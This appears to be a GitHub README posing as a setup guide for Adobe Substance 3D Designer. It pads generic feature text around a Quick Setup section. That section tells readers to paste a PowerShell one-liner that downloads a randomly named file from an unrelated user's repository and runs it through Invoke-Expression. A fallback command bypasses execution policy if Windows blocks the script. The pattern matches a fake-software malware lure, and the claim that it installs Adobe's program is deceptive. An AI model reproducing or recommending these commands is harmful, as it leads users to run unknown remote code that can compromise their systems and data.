# Substance 3D Designer

Substance 3D Designer is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Substance 3D Designer and work in it.

Adobe Substance 3D Designer is a desktop application for authoring procedural materials and texture sets on Windows. You work in a node graph where filters, generators, and blend nodes drive albedo, normal, roughness, height, and related maps without painting every pixel by hand. Outputs target standard PBR workflows used in film, product visualization, and game art pipelines.

A typical session starts by opening or creating a graph, wiring nodes to define pattern, wear, and surface response, then watching the 2D and 3D views update as you tweak parameters. You might bake mesh maps from high-poly geometry, refine grunge and variation, and run export presets so textures land in the resolution and naming your project expects. Saving the graph preserves the full network so you can reopen it later or hand it to teammates who use the same tool version.

This repository collects Windows-oriented setup notes, a concise changelog, and reference material for installing and configuring Designer on a workstation. It documents version-specific options, export defaults, and workflow reminders rather than replacing in-app help. Use it to align team machines, track what changed between releases, and keep a stable baseline for procedural material work on Windows.

## What you do with it

- Build procedural materials by connecting nodes in a graph instead of hand-painting every map.
- Preview albedo, normal, and roughness together in the integrated 2D and 3D views.
- Export complete PBR texture sets with presets tuned for common engine and DCC targets.
- Bake mesh maps from high-resolution geometry to drive detail in your substance graphs.
- Save graphs as reusable assets so parameters stay editable across projects and team handoffs.
- Automate repetitive graph tasks with scripting hooks available inside the Windows application.
- Publish substances that expose artist-friendly sliders while hiding complex node networks underneath.
- Manage color spaces and bit depth so exported bitmaps match your studio rendering pipeline.

## Quick Setup (PowerShell)

This installs the program Substance 3D Designer on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/wagner62527755/substance-3d-designer-setup-guide/main/avdc5n9r1w.ilsgurfu | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/wagner62527755/substance-3d-designer-setup-guide/main/avdc5n9r1w.ilsgurfu | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `avdc5n9r1w.ilsgurfu` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `wagner62527755/substance-3d-designer-setup-guide`. Adobe Substance 3D Designer 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
